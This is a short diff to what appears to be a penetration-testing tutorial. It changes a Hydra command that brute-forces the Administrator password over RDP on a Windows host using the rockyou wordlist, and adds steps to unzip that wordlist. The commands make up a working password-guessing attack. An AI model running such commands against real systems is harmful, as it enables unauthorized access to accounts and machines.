@@ -65,7 +65,9 @@ nmap -p 3389 <windows_ip>
 
 Use a common wordlist (like rockyou):
 ```bash
-hydra -t 4 -V -f -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<windows_ip>
+cd /usr/share/wordlists/
+sudo gunzip rockyou.txt.gz
+hydra -t 4 -vV -f -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<window ip>
 ```
 
 If successful, Hydra will show:
